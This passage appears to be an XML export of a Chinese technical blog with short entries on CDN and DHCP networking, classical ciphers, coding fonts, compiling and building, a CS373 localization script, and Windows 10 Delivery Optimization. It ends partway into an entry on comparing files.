<p>CDN 通常采用两种不同的服务器安置原则：</p>
<ul>
<li><strong>深入</strong>：该原则是通过在遍及全球的接入 ISP 中部署服务器集群来深入到 ISP 的接入网中。由 Akamai 首创。其目标是靠近端用户，通过减少端用户和 CDN 集群之间（内容从这里收到）链路和路由器的数量，从而改善了用户感受的时延和吞吐量。因为这种高度分布式设计，维护和管理集群的任务成为挑战。</li>
<li><strong>邀请做客</strong>：该原则是通过在少量（例如 10 个）关键位置建造大集群来 <em>邀请到 ISP 做客</em>。该原则由 Limelight 和许多其他 CDN 公司所采用。不是将集群放在接入 ISP 中，这些 CDN 通常将它们的集群放置在因特网交换点（IXP）。与深入设计原则相比，邀请做客设计通常产生较低的维护和管理开销，可能以对端用户的较高时延和较低吞吐量为代价。</li>
</ul>
<p>一旦 CDN 的集群准备就绪，它就可以跨集群复制内容。CDN 可能不希望将每个内容的副本放置在每个集群中，因为某些内容很少访问或仅在某些国家中流行。事实上，许多 CDN 没有将内容推入它们的集群，而是使用一种简单的<strong>拉策略</strong>：如果客户向一个未存储该内容的集群请求某内容，则该集群检索该内容（从某中心仓库或者从另一个集群），向客户传输内容时的同时在本地存储一个副本。类似于 Web 缓存器，当某集群存储器变满时，它删除不经常请求的内容。</p>
<p>当用户主机中的一个浏览器指令检索一个特定的视频（由 URL 标识）时，CDN 必须截获该请求，以便能够：</p>
<ol>
<li>确定此时适合用于该客户的 CDN 服务器集群；</li>
<li>将客户的请求重定向到该集群的某台服务器。</li>
</ol>
<p>大多数 CDN 利用 DNS 来截获和重定向请求，其步骤如下：</p>
<ol>
<li>用户访问目标网页；</li>
<li>当用户点击链接时，该用户主机发送了一个对于目标 URL 的 DNS 请求；</li>
<li>用户的本地 DNS 服务器（LDNS）将该 DNS 请求中继到 <em>目标服务器的权威 DNS 服务器</em>，<em>目标服务器的权威 DNS 服务器</em> 并不返回一个 IP 地址，而是向 LDNS 返回一个 <em>第三方 CDN 的主机名</em>；</li>
<li>从这时起，DNS 请求进入了 <em>第三方 CDN 的专用 DNS 基础设施</em>。用户的 LDNS 则发送第二个请求，此时是对 <em>第三方 CDN 的主机名</em> 的 DNS 请求，<em>第三方 CDN 的 DNS 系统</em> 最终向 LDNS 返回 <em>第三方 CDN 服务器</em> 的 IP 地址。所以正是在这里，在 <em>第三方 CDN 的 DNS 系统</em> 中，指定了 CDN 服务器，客户将能够从这台服务器接收到它的内容；</li>
<li>LDNS 向用户主机转发 <em>第三方 CDN 节点</em> 的 IP 地址；</li>
<li>一旦客户收到 <em>第三方 CDN 节点</em> 的 IP 地址，它与具有该 IP 地址的服务器创建了一条直接的 TCP 连接，并且发出对该网页的 HTTP GET 请求。</li>
</ol>
<p>任何 CDN 部署，其核心是<strong>集群选择策略</strong>（cluster selection strategy），即动态地将客户定向到 CDN 中的某个服务器集群或数据中心的机制。如上所述，经过客户的 DNS 查找，CDN 得知了该客户的 LDNS 服务器的 IP 地址。在得知该 IP 地址之后，CDN 需要基于该 IP 地址选择一个适当的集群。CDN 一般采用专用的集群选择策略。</p>
<p>一种简单的策略是指派客户到<strong>地理上最为临近</strong>（geographically closest）的集群。使用商用地理位置数据库，每个 LDNS IP 地址都映射到一个地理位置。当从一个特殊的 LDNS 接收到一个 DNS 请求时，CDN 选择地理上最为接近的集群，即离 LDNS 最少几千米远的集群。这样的解决方案对于众多用户来说能够工作得相当好。但对于某些客户，该解决方案可能执行的效果差，因为就网络路径的长度或跳数而言，地理最临近的集群可能并不是最近的集群。此外，一种所有基于 DNS 的方法都内在具有的问题是，某些端用户配置使用位于远地的 LDNS，在这种情况下，LDNS 位置可能远离客户的位置。此外，这种简单的策略忽略了时延和可用带宽随因特网路径时间而变化，总是为特定的客户指派相同的集群。</p>
<p>为了基于 <em>当前</em> 流量条件为客户决定最好的集群，CDN 能够对其集群和客户之间的时延和丢包性能执行周期性的<strong>实时测量</strong>（real-time measurement）。例如，CDN 能够让它的每个集群周期性地向位于全世界的所有 LDNS 发送探测分组（例如，ping 报文或 DNS 请求）。这种方法的一个缺点是许多 LDNS 被配置为不会响应这些探测。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码学</title>
    <url>/2018/08/10/classical-crypto/</url>
    <content><![CDATA[<p>密码学（Cryptography）大致可分为<strong>古典密码学</strong>（Classic cryptography）和<strong>现代密码学</strong>（Modern cryptography），两者的主要差别在于计算机的使用，一般来说，古典密码学是基于<strong>字符</strong>的，而现代密码学是基于<strong>二进制位</strong>的。古典密码学主要包括两类，即<strong>代换</strong>和<strong>置换</strong>。</p>
<h2 id="代换"><a href="#代换" class="headerlink" title="代换"></a>代换</h2><p>代换密码是将明文中的字符替代成其他字符，即<strong>替代转换</strong>，若整个加密过程中每个字符采用同一张表替代，则为<strong>单表代换密码</strong>，类似的，若整个加密过程中每个字符采用不同的表替代，则为<strong>多表代换密码</strong>，典型的单表代换密码有凯撒密码、培根密码等，多表代换密码有维吉尼亚密码等。</p>
<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>凯撒密码（Caesar cipher）就是将明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量为 3 时，所有的字母 A 将被替换成 D，B 变成 E，以此类推。</p>
<p>明文 <code>Hello World</code> 的加密过程如下：</p>
<ol>
<li>取偏移量为 3</li>
<li>计算 <code>H</code> 的后 3 位为 <code>K</code></li>
<li>以此类推</li>
<li>密文为：<code>Khoor Zruog</code></li>
</ol>
<p>类似的，解密过程如下：</p>
<ol>
<li>计算 <code>K</code> 的前 3 位为 <code>H</code></li>
<li>以此类推</li>
<li>明文为：<code>Hello World</code></li>
</ol>
<p>注意：当偏移量为 13 时，这种凯撒密码的特例又被称为 <strong>ROT13</strong>（回转 13 位）加密，ROT13 加密是一种<strong>对等加密</strong>（Reciprocal cipher），对等加密是对称加密的一个特例，即该类密码的加密算法是它自己本身的逆反函数，换言之，要对其解密，只需对其密文再次套用加密算法即可。当偏移量未知时，可采用穷举法一个个试，偏移量必定小于 26。</p>
<span id="more"></span>

<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>培根密码（Bacon&#39;s cipher）加密时，明文中的每个字母都会转换成一组 5 个英文字母。其转换依靠下表：</p>
<table>
<thead>
<tr>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>AAAAA</td>
<td>g</td>
<td>AABBA</td>
<td>n</td>
<td>ABBAA</td>
<td>t</td>
<td>BAABA</td>
</tr>
<tr>
<td>b</td>
<td>AAAAB</td>
<td>h</td>
<td>AABBB</td>
<td>o</td>
<td>ABBAB</td>
<td>u-v</td>
<td>BAABB</td>
</tr>
<tr>
<td>c</td>
<td>AAABA</td>
<td>i-j</td>
<td>ABAAA</td>
<td>p</td>
<td>ABBBA</td>
<td>w</td>
<td>BABAA</td>
</tr>
<tr>
<td>d</td>
<td>AAABB</td>
<td>k</td>
<td>ABAAB</td>
<td>q</td>
<td>ABBBB</td>
<td>x</td>
<td>BABAB</td>
</tr>
<tr>
<td>e</td>
<td>AABAA</td>
<td>l</td>
<td>ABABA</td>
<td>r</td>
<td>BAAAA</td>
<td>y</td>
<td>BABBA</td>
</tr>
<tr>
<td>f</td>
<td>AABAB</td>
<td>m</td>
<td>ABABB</td>
<td>s</td>
<td>BAAAB</td>
<td>z</td>
<td>BABBB</td>
</tr>
</tbody></table>
<p>按照上表，明文 <code>hello</code> 的密文为 <code>AABBBAABAAABABBABABBABBBA</code>，显然，密文的长度是明文长度的 <strong>5</strong> 倍。</p>
<p>除了上表用来加密小写明文外，还有一张用来加密大写明文的表，如下：</p>
<table>
<thead>
<tr>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>aaaaa</td>
<td>G</td>
<td>aabba</td>
<td>M</td>
<td>abbaa</td>
<td>S</td>
<td>baaba</td>
<td>Y</td>
<td>bbaaa</td>
</tr>
<tr>
<td>B</td>
<td>aaaab</td>
<td>H</td>
<td>aabbb</td>
<td>N</td>
<td>abbab</td>
<td>T</td>
<td>baabb</td>
<td>Z</td>
<td>bbaab</td>
</tr>
<tr>
<td>C</td>
<td>aaaba</td>
<td>I</td>
<td>abaaa</td>
<td>O</td>
<td>abbba</td>
<td>U</td>
<td>babaa</td>
<td></td>
<td></td>
</tr>
<tr>
<td>D</td>
<td>aaabb</td>
<td>J</td>
<td>abaab</td>
<td>P</td>
<td>abbbb</td>
<td>V</td>
<td>babab</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E</td>
<td>aabaa</td>
<td>K</td>
<td>ababa</td>
<td>Q</td>
<td>baaaa</td>
<td>W</td>
<td>babba</td>
<td></td>
<td></td>
</tr>
<tr>
<td>F</td>
<td>aabab</td>
<td>L</td>
<td>ababb</td>
<td>R</td>
<td>baaab</td>
<td>X</td>
<td>babbb</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>同理，明文 <code>HELLO</code> 的密文为 <code>aabbbaabaaababbababbabbba</code>。</p>
<p>注意：虽然表中出现了 <code>A</code> <code>B</code> 两种字符，但培根密码的本质是二进制，即用两种不同的特征来加密明文，可以是字母的大小写或字体的样式等等。例如采用字母的大小写加密 <code>hello</code> 为 <code>GOod gOOd STUdY, dAY dAy UP, haHa</code>，其中大写代表 <code>A</code>，小写代表 <code>B</code>；类似的，也可以用粗体代表 <code>A</code>，正常代表 <code>B</code>，以字体的样式加密 <code>hello</code>。显然，培根密码所包含的信息可以和用于承载其的文章完全无关。</p>
<h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，用来加解密的维吉尼亚表格如下所示：</p>
<p><img src="/images/vigenere.png" alt="维吉尼亚表格"></p>
<p>这一表格包括了 26 行字母表，每一行都由前一行向左偏移 1 位得到。<strong>行为明文行，列为密钥列，密文位于表格内。</strong></p>
<p>明文 <code>HELLOWORLD</code> 的加密结果如下：</p>
<ol>
<li>选择某一关键词作为密钥，如 <code>SECRET</code></li>
<li>对于明文第 1 个字母 <code>H</code>，对应密钥的第 1 个字母 <code>S</code>，于是使用表格中 <code>S</code>行字母表进行加密，得到密文第一个字母 <code>Z</code></li>
<li>以此类推，若密钥长度小于明文长度，则转到密钥第 1 个字母继续循环，最终得到密文 <code>ZINCSPGVNU</code></li>
</ol>
<p>类似的，解密过程如下：</p>
<ol>
<li>根据密钥第 1 个字母 <code>S</code> 所对应的 <code>S</code> 行字母表，发现密文第 1 个字母 <code>Z</code> 位于 <code>H</code> 列，因而明文第 1 个字母为 <code>H</code></li>
<li>依次类推</li>
</ol>
<p>显而易见，维吉尼亚密码相对于本文介绍的其他古典密码，很难利用穷举法破解。</p>
<h2 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h2><p>置换密码是将明文中的字母重新排列，字母本身不变，但其位置改变，即<strong>位置转换</strong>，典型的有栅栏密码等。</p>
<h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>栅栏密码（Rail fence cipher），又称篱笆密码，就是把要加密的明文分成 n 个一组，然后把每组的第一个字连起来，紧接着把每组的第二个字连起来，以此类推，形成一段无规律的话。</p>
<p>明文 <code>Hello World</code> 的加密过程如下：</p>
<ol>
<li>去掉空格：<code>HelloWorld</code></li>
<li>5 个一组：<code>Hello</code>，<code>World</code></li>
<li>取出每组第 1 个字母：<code>HW</code></li>
<li>取出每组第 2 个字母：<code>eo</code></li>
<li>以此类推</li>
<li>连在一起：<code>HWeolrllod</code></li>
<li>加上适当空格：<code>HWeol rllod</code></li>
</ol>
<p>类似的，解密过程如下：</p>
<ol>
<li>去掉空格：<code>HWeolrllod</code></li>
<li>分成 5 栏：<code>HW</code>、<code>eo</code>、<code>lr</code>、<code>ll</code>、<code>od</code></li>
<li>取出每栏第 1 个字母：<code>Hello</code></li>
<li>依次类推</li>
<li>连在一起：<code>HelloWorld</code></li>
<li>加上适当空格：<code>Hello World</code></li>
</ol>
<p>注意：这里栅栏的栏数取决于 n 的取值，一般而言，n 要整除字母数，n 不可能大于或等于字母数，当不知道 n 为多少时，可采用穷举法一个个试。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码"></a>当铺密码</h3><p>准确来说，当铺密码不是一种加密方式而是一种编码方式，它是将中文和数字进行转化的算法，具体为：当前汉字有多少笔画出头，就转化成数字几。如 <code>王夫 井工 夫口 由中人</code> 即为 <code>67 84 70 123</code>。</p>
<h3 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h3><p>猪圈密码（Pigpen cipher），又称共济会密码（Masonic cipher），是一种以格子为基础的简单代换式密码。下图为猪圈密码中所用符号与 26 个英语字母之间的对应关系：</p>
<p><img src="/images/pigpen.png" alt="猪圈密码"></p>
<p>明文 <code>X MARKS THE SPOT</code> 的加密结果如下：</p>
<p><img src="/images/pigpen-eg.png" alt="猪圈密码例子"></p>
<h4 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h4><p>猪圈密码还有一种变形，即采用图片中字符位置一一对应的形式加解密，如 <code>FLAG</code> 可加密为 <code>OCJP</code>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>写代码应该用哪种字体</title>
    <url>/2018/09/23/code-font/</url>
    <content><![CDATA[<h2 id="等宽字体与比例字体"><a href="#等宽字体与比例字体" class="headerlink" title="等宽字体与比例字体"></a>等宽字体与比例字体</h2><p>等宽字体（Monospaced）是指字符宽度相同的电脑字体，与此相对，字符宽度不尽相同的电脑字体称为比例字体（Proportional）。一图胜千言，如下：</p>
<p><img src="/images/monospaced.PNG" alt="等宽字体与比例字体"></p>
<p>在早期的电脑中，由于技术的局限，无法进行字母宽度的比例调整，因此只能将每个字符都制作成一样的宽度，从而形成了等宽字体。在等宽字体中，字母 <code>i</code>，<code>j</code> 显得两侧余白较多，而字母 <code>w</code>，<code>m</code> 等的笔画显得相当拥挤。但是随着图形用户界面主流的更新和计算机技术的提高，处理比例字体的局限性得到了突破，因此现在排版上显得比较自然的比例字体的使用已经相当普及。这里所讨论的都是英文字体，对于中文字体而言，一般认为它们都是等宽的。<br>Windows 中常用的等宽字体为 <strong>Consolas</strong>；macOS 中常用的等宽字体为 <strong>Menlo</strong>；Linux 中常用的等宽字体为 <strong>Mono</strong>。</p>
<span id="more"></span>
<h2 id="衬线字体与非衬线字体"><a href="#衬线字体与非衬线字体" class="headerlink" title="衬线字体与非衬线字体"></a>衬线字体与非衬线字体</h2><p>顾名思义，衬线体（Serif）和无衬线体（Sans-Serif）的区别就在于有无<strong>衬线</strong>，而衬线则指的是字形笔画末端的装饰细节部分。一图胜千言，如下：</p>
<p><img src="/images/serif.PNG" alt="衬线字体与非衬线字体"></p>
<p>这里所讨论的都是英文字体，对于简体中文字体而言，习惯性称衬线字体为<strong>宋体</strong>，非衬线字体为<strong>黑体</strong>，如下：</p>
<p><img src="/images/song-hei.png" alt="宋体与黑体"></p>
<p>衬线字体常用于印刷业，而且特别适用于长篇文章段落；非衬线字体简洁大方，适用于广告、标志、牌子等短句。另外，系统、程序和网页中的字体也几乎都是非衬线字体，即使是很长的段落，这是因为显示器分辨率低，字体不能减小，如果用衬线字体，那些边边角角就很难用像素显示清楚，结果反而不利于阅读。<br>Google 在 2015 年就将其原本的衬线体 Logo 换成了无衬线体 Logo:</p>
<p><img src="/images/google.gif" alt="Google Logo 变化"></p>
<p>我们在写 Word 文档时，常用的英文衬线字体就是 <strong>Times New Roman</strong>；而在做 PPT 时，个人倾向于使用非衬线字体<strong>微软雅黑</strong>。</p>
<h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><p>写代码应该使用的字体对于衬线或非衬线要求不大，但强烈建议使用等宽字体，这样可以便于代码对齐，因为比例字体的宽度不定，这会对代码对齐造成极大的困难。另外，还应该对特殊字符有较高的辨识度，比如 <code>I</code>（大写 <code>i</code>）、<code>l</code>（小写 <code>L</code>）、<code>1</code>（数字 <code>1</code>），<code>0</code>（数字 <code>0</code>）、<code>O</code>（大写 <code>o</code>） 等。最后，中文字符的宽度应该严格是英文字符宽度的 2 倍，在某些时候，你会发现这很有用。</p>
<p>基于以上，个人倾向于使用 be5invis 开发的 <a href="https://github.com/be5invis/Sarasa-Gothic">Sarasa-Gothic（更纱黑体）</a> 系列字体，它的前身便是 Inziu Iosevka 系列字体，现在已经迁移至 Sarasa-Gothic，推荐使用其中的 <strong>Sarasa Term SC</strong> 型字体。此外，这一系列字体都是开源免费的。</p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>在下载某些字体时，可能会遇到相关术语，如下：</p>
<ul>
<li>mono：即 Monospaced，等宽字体</li>
<li>sans：即 Sans-Serif，无衬线体</li>
<li>gothic：哥特体，即无衬线体</li>
<li>bold：粗体</li>
<li>italic：斜体</li>
<li>bolditalic：加粗斜体</li>
<li>regular：常规体</li>
<li>sc：即 Simplified Chinese，简体中文</li>
<li>tc：即 Traditional Chinese，繁体中文</li>
<li>cl：即 Classical Literature，《康熙字典》字形</li>
<li>j：即 Japanese，日文</li>
<li>ligature：连体字符，举例来说，会把 <code>!=</code> 变成 <code>≠</code></li>
</ul>
<h2 id="配色"><a href="#配色" class="headerlink" title="配色"></a>配色</h2><p>关于代码配色，就真是个“仁者见仁，智者见智”的问题了，个人要求满足以下两点：</p>
<ol>
<li>采用黑色背景</li>
<li>官网提供多种编辑器的支持</li>
</ol>
<p>综上，个人倾向于使用 <a href="https://draculatheme.com/">Dracula</a> 。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>编译与构建</title>
    <url>/2018/07/15/compile-build/</url>
    <content><![CDATA[<p>在一般意义上而言，本文 <strong>编译与构建</strong> 的内容适用于 <strong>编译型语言</strong> 。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><strong>编译（compile）</strong>，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为<strong>编译器（compiler）</strong>。但要注意，编译器在同一时刻只能转换一个编译单元，所谓<strong>编译单元</strong>是指单个的源文件。</p>
<p>编译器一般由相应的编程语言提供。</p>
<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><p>程序通常由多个编译单元组成，倘若逐个的去编译，这多少显得有点琐碎，因此我们需要一个自动化工具用来从源代码生成用户可以使用的目标文件，而这个工具就是<strong>构建系统（build system）</strong>，构建系统所作的就是<strong>构建（build）</strong>，构建的过程中肯定会调用到编译。从这个意义上来说，构建的范围比编译更广。</p>
<p>现在的很多构建系统也包含了<strong>包管理器（package manager）</strong>的功能，用以解决项目依赖的问题。</p>
<span id="more"></span>

<h2 id="另外的"><a href="#另外的" class="headerlink" title="另外的"></a>另外的</h2><p>在 Linux 中 编译 C/C++，使用最广的编译器是 <strong><a href="https://gcc.gnu.org/">GCC</a></strong> ，即 GNU Compiler Collection（GNU 编译器套件），GCC 的原名为 GNU C Compiler（GNU C 语言编译器），因为在后续逐渐支持了 C++、Java 等更多的语言，所以更改了其缩写的含义。有关 GCC 更详细的信息可参考 <a href="/2019/04/18/gcc/" title="GCC 小记">GCC 小记</a>。</p>
<p>除此之外，另一个 C/C++ 编译器 <strong><a href="http://clang.llvm.org/">Clang</a></strong> 旨在替代 GCC。</p>
<p>在 Linux 中使用最广的构建系统是 <strong><a href="https://www.gnu.org/software/make/">GNU make</a></strong> ，它会读取 <strong>Makefile</strong> 文件中的配置信息来完成构建，有关 Makefile 文件更详细的信息可参考 <a href="/2019/04/18/makefile/" title="Makefile 小记">Makefile 小记</a>。</p>
<p>Java 世界中使用最广的构建系统是 <strong><a href="https://maven.apache.org/">Maven</a></strong> ，而在 Android Studio 中则使用到了后起之秀 <strong><a href="https://gradle.org/">Gradle</a></strong> 。</p>
<p>C 语言从源代码到可执行文件的过程依次经过了<strong>预处理</strong>、<strong>编译</strong>、<strong>链接</strong>这几个步骤，即我们常说的 GCC 是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。</p>
<p>普通编译是生成当前系统平台下的目标文件，而<strong>交叉编译</strong>是指生成另一个系统平台下的目标文件。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Udacity CS373：无人驾驶汽车编程学习笔记一</title>
    <url>/2017/12/14/cs373-1/</url>
    <content><![CDATA[<h2 id="一：定位"><a href="#一：定位" class="headerlink" title="一：定位"></a>一：定位</h2><p>蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。</p>
<p>基于一维的蒙特卡罗定位程序如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">world = [<span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">measurements = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">motions = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">pHit = <span class="number">0.6</span></span><br><span class="line">pMiss = <span class="number">0.2</span></span><br><span class="line">pExact = <span class="number">0.8</span></span><br><span class="line">pOvershoot = <span class="number">0.1</span></span><br><span class="line">pUndershoot = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sense</span>(<span class="params">p, Z</span>):</span></span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        hit = (Z == world[i])</span><br><span class="line">        q.append(p[i] * (hit * pHit + (<span class="number">1</span>-hit) * pMiss))</span><br><span class="line">    s = <span class="built_in">sum</span>(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        q[i] = q[i]/s</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">p, U</span>):</span></span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        s = pExact * p[(i-U) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pOvershoot * p[(i-U-<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pUndershoot * p[(i-U+<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(measurements)):</span><br><span class="line">    p = sense(p, measurements[k])</span><br><span class="line">    p = move(p, motions[k])</span><br><span class="line">    <span class="built_in">print</span> p</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CS373</tag>
        <tag>无人驾驶</tag>
      </tags>
  </entry>
  <entry>
    <title>curl wget</title>
    <url>/2018/09/19/curl-wget/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Windows10的传递优化</title>
    <url>/2018/07/16/delivery-optimization/</url>
    <content><![CDATA[<p>为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即<a href="https://privacy.microsoft.com/zh-CN/windows-10-windows-update-delivery-optimization"><strong>传递优化</strong></a>(Delivery Optimization)，这本质上是一种P2P架构，换句话来说，倘若开启了传递优化功能，更新时将会额外的从别的已更新的且开启传递优化功能的电脑上下载，同时也会上传已更新的文件到需要更新的电脑上。值得注意的是，传递优化对局域网进行了特殊处理，即当局域网内一台电脑完成更新后，传递优化会使得此局域网内的其他电脑依次完成更新。<br>开启或关闭传递优化的设置路径为：设置 ——&gt; 更新和安全 ——&gt; Windows更新 ——&gt; 高级选项 ——&gt; 传递优化。传递优化用于上传的文件路径位于：C:\Windows\Logs\dosvc。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>DHCP 运行机制</title>
    <url>/2021/03/07/dhcp/</url>
    <content><![CDATA[<p><strong>DHCP</strong>（Dynamic Host Configuration Protocol，<strong>动态主机配置协议</strong>）允许主机自动获取（被分配）一个 IP 地址。网络管理员能够配置 DHCP，以使某给定主机每次与网络连接时能得到一个相同的 IP 地址，或者某主机将被分配一个<strong>临时的 IP 地址</strong>（temporary IP address），每次与网络连接时该地址也许是不同的。除了主机 IP 地址分配外，DHCP 还允许一台主机得知其他信息，例如它的子网掩码、它的第一跳路由器地址（常称为<strong>默认网关</strong>）与它的本地 DNS 服务器的地址。</p>
<p>由于 DHCP 具有将主机连接进一个网络的网络相关方面的自动能力，故它又常被称为<strong>即插即用协议</strong>（plug-and-play protocol）或<strong>零配置（zeroconf）协议</strong>。</p>
<span id="more"></span>

<p>DHCP 是一个客户 — 服务器协议。客户通常是新到达的主机，它要获得包括自身使用的 IP 地址在内的网络配置信息。在最简单场合下，每个子网将具有一台 DHCP 服务器。如果在某子网中没有服务器，则需要一个 DHCP 中继代理（通常是一台路由器），这个代理知道用于该网络的 DHCP 服务器的地址。</p>
<h2 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h2><p>对于一台新到达的主机而言，DHCP 协议是一个 4 个步骤的过程：</p>
<ol>
<li><strong>DHCP 服务器发现</strong>：客户在 UDP 分组中向端口 67 发送 <strong>DHCP 发现报文</strong>（DHCP discover message），该 UDP 分组封装在一个 IP 数据报中，其中使用广播目的地址 <code>255.255.255.255</code> 并且使用“本主机”源 IP 地址 <code>0.0.0.0</code>。DHCP 客户将该 IP 数据报传递给链路层，链路层然后将该帧广播到所有与该子网连接的节点。</li>
<li><strong>DHCP 服务器提供</strong>：DHCP 服务器收到一个 DHCP 发现报文时，用 <strong>DHCP 提供报文</strong>（DHCP offer message）向客户做出响应，该报文向该子网的所有节点广播，仍然使用 IP 广播地址 <code>255.255.255.255</code>。因为在子网中可能存在几个 DHCP 服务器，该客户也许会发现它处于能在几个提供者之间进行选择的优越位置。每台服务器提供的报文包含有收到的发现报文的事务 ID、向客户推荐的 IP 地址、网络掩码以及 <strong>IP 地址租用期</strong>（address lease time），即 IP 地址有效的时间量。服务器租用期通常设置为几小时或几天。</li>
<li><strong>DHCP 请求</strong>：新到达的客户从一个或多个 <em>服务器提供</em> 中选择一个，并向选中的 <em>服务器提供</em> 用 <strong>DHCP 请求报文</strong>（DHCP request message）进行响应，回显配置的参数。</li>
<li><strong>DHCP ACK</strong>：服务器用 <strong>DHCP ACK 报文</strong>（DHCP ACK message）对 DHCP 请求报文进行响应，证实所要求的参数。</li>
</ol>
<p>一旦客户收到 DHCP ACK 后，交互便完成了，并且该客户能够在租用期内使用 DHCP 分配的 IP 地址。因为客户可能在该租用期超时后还希望使用这个地址，所以 DHCP 还提供了一种机制以允许客户更新它对一个 IP 地址的租用。</p>
<h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>从移动性角度看，每当节点连到一个新子网，要从 DHCP 得到一个新的 IP 地址，当一个移动节点在子网之间移动时，就不能维持与远程应用之间的 TCP 连接。</p>
<p>此外，学校机房、网吧等地方不使用 DHCP 而使用静态 IP 是为了方便监控。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:222-225.</a></li>
<li><a href="https://www.zhihu.com/question/20971480">为什么学校、网吧机房基本都不使用DHCP？</a></li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>如何比较两个文件之间的差异</title>
    <url>/2018/10/19/diff/</url>
    <content><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在Windows下，可以使用系统自带的<code>fc</code>命令（即file compare的缩写），比如<code>fc game_old.js game_new.js</code>，结果如下：</p>
